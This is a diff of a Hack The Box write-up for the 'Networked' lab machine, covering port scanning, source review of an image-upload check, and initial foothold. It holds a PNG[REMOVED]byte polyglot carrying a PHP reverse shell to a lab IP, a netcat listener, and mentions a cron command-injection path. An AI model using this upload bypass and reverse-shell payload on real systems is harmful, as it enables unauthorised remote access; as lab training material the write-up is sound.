@@ -20,7 +20,7 @@
 ---
 
 ## 🛠️ Tools Used
-`Your mind and eyes!!`, `Nmap`, `dirb`, `hexcurse`, `nc`
+`Your mind and eyes!!`, `Nmap`, `dirb`, `xxd`, `hexcurse`, `nc`
 
 ---
 
@@ -31,7 +31,7 @@ Attacker = 10.10.14.34
 Target = 10.129.26.10
 
 ### 1.1 Port Scanning
-```bash
+```BASH
 sudo nmap -sS -p- -A -T4 10.129.26.10
 ```
 🧐 Findings:
@@ -58,8 +58,9 @@ OS CPE: cpe:/o:linux:linux_kernel:3
 > 2.4.6
 
 ### 1.2 Directory Brute-forcing
-```bash
+```BASH
 sudo nmap --script vuln -p80 10.129.26.10
+
 dirb http://10.129.26.10
 ```
 🧐 Findings:
@@ -76,6 +77,7 @@ PORT   STATE SERVICE
 |   /backup/: Backup folder w/ directory listing
 |   /icons/: Potentially interesting folder w/ directory listing
 |_  /uploads/: Potentially interesting folder
+
 
 -----------------
 DIRB v2.22    
@@ -96,6 +98,7 @@ GENERATED WORDS: 4612
 + http://10.129.26.10/index.php (CODE:200|SIZE:229)                                                                
 ==> DIRECTORY: http://10.129.26.10/uploads/ 
 ```
+
 Cool, let's see each one
 
 
@@ -122,6 +125,8 @@ Now, I downloaded the `backup.tar` folder and extracted it, and found ***four fi
 📑 `upload.php`
 
 ```PHP
+$validext = array('.jpg', '.png', '.gif', '.jpeg');
+
 foreach ($validext as $vext) {
   if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
     $valid = true;
@@ -155,6 +160,7 @@ function check_file_type($file) {
 * **MIME-Type Check:** The code relies on what the browser sends in the header (Content-Type) must be starting with `image/`. Since we can modify it with Burp Suite to `image/png`, while the file is PHP, the server is fooled... but it will NOT work alone because of `file_mime_type` function below..
 
 
+
 📑 `lib.php`
 
 ```PHP
@@ -168,7 +174,8 @@ function file_mime_type($file) {
   }
 }
 ```
-* **file_mime_type function:** This function uses the PHP library to verify that the file is indeed an image by looking only at the Magic Bytes (the first bytes of the file). Therefore now, I can place the PNG fingerprint at the beginning of my PHP file, and it will be allowed to pass through.
+* **Magic Bytes Check:** `file_mime_type` function witch uses the PHP library to verify that the file is indeed an image by looking at the Magic Bytes (the first bytes of the file thats defines the real file extintion). Therefore now, I can place the PNG fingerprint at the beginning of my PHP file, and it will be allowed to pass through.
+
 
 
 📑 `photos.php`
@@ -182,24 +189,67 @@ foreach (scandir($path) as $file) {
 * **File display:** Locates the uploads folder and displays (executes/runs) the files.
 
 
+> [!NOTE]
+> 
+> After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)
+> 
+> PNG
+>
 
-🚀 Phase 2: Initial Access (Exploitation)
-Vulnerability: [e.g., Insecure File Upload]
-The source code revealed that it only checks for MIME Type and IP-based filenames.
+---
 
-Steps to Exploit:
+## 🚪 2: Initial Foothold
 
-Created a PNG polyglot file using printf.
+We define that's the system web vulnerability is **Insecure File Upload**
 
-Embedded a PHP reverse shell payload.
+So let's create my PHP reverse shell as a PNG image 👾
 
-Named the file 10_10_14_34.php.png to bypass the regex check.
+According to [File Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5?permalink_comment_id=3860213#image-files), the PNG magic bytes are `89 50 4E 47 0D 0A 1A 0A` then I'll use **xxd** tool with the `-r` (Reverse) option to convert the Hex to binary data and the `-p` (Plain) option to read the text passed to it directly as Hex then save these bytes into `hi.php.png` file:
 
-Bash
-printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > 10_10_14_34.php.png
-echo '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.34/9000 0>&1\""); ?>' >> 10_10_14_34.php.png
-🛡️ Phase 3: Privilege Escalation
-User: [Username]
+```bash
+echo "89504e470d0a1a0a" | xxd -r -p > hi.php.png
+```
+Then, create the reverse shell PHP payload on port 9000 from [Reverse Shell Generator](https://www.revshells.com/) in PHP tags and append it into `hi.php.png`:
+
+```bash
+echo '<?php system("bash -i >& /dev/tcp/10.10.14.34/9000 0>&1"); ?>' >> hi.php.png
+```
+
+To ensure the file signature and data, I use **hexcurse** tool:
+```bash
+hexcurse hi.php.png
+```
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/5.1-hexcurse.png)
+All is good..👾
+
+Let's open a listener on port 9000 with **netcat (nc)** tool and specifying the `-l` (listen), `-v` (verbose), `-n` (numeric only, no DNS), and `-p` (port) flags:
+```bash
+nc -lvnp 9000
+```
+
+Upload ***hi.php.png*** in `/upload.php`, open `\photos.php` to load the code:
+
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/4-upload.png)
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/6-upload-successfully.png)
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/7-photos.png)
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/8-apache-user.png)
+
+finally landing! 🛬 I'm apache user, lets countinue
+
+---
+
+## 🧠 3: Privilege Escalation (guly)
+
+Current User: apache
+
+Target User: guly
+
+I discover the user "guly" by listing all dirictoris in the `/home`, and listing all files there:
+
+![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/9-discover-users.png)
+
+
+
 Found a cronjob running a script named check_attack.php every 3 minutes.
 
 Vulnerability: Command Injection via filename in exec() function.
